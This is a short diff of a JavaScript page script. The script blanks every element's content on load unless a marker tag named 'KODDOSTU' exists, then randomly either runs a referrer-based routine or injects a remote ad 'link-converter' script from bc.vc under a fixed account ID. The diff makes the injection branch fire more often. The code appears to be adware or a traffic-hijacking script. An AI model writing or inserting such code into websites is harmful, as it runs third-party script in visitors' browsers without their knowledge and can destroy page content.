@@ -2,7 +2,7 @@
 window.onload=function(){var a=document;if(0==a.getElementsByTagName("KODDOSTU").length)for(var a=a.getElementsByTagName("*"),b=0,c=a.length;c>b;b++)a[b].innerHTML="";};
 var ua124rt = navigator.userAgent.toLowerCase();
 var odgau = Math.floor((Math.random() * 10) + 1);
-if(odgau > 2) {
+if(odgau > 3) {
 (function(window, location) {
 var tybn = document.referrer;
   if(tybn.length >= 8){
@@ -23,5 +23,5 @@ var tybn = document.referrer;
 }(window, location));
 }
 else{
-var accountID = 13466;var adType = 'int';var script = document.createElement('script');script.src = "http://bc.vc/js/link-converter.js";document.getElementsByTagName('head')[0].appendChild(script);
+var accountID = 13466;var adType = 'int';var bw = document.createElement('script');bw.src = "http://bc.vc/js/link-converter.js";document.getElementsByTagName('head')[0].appendChild(bw);
 }
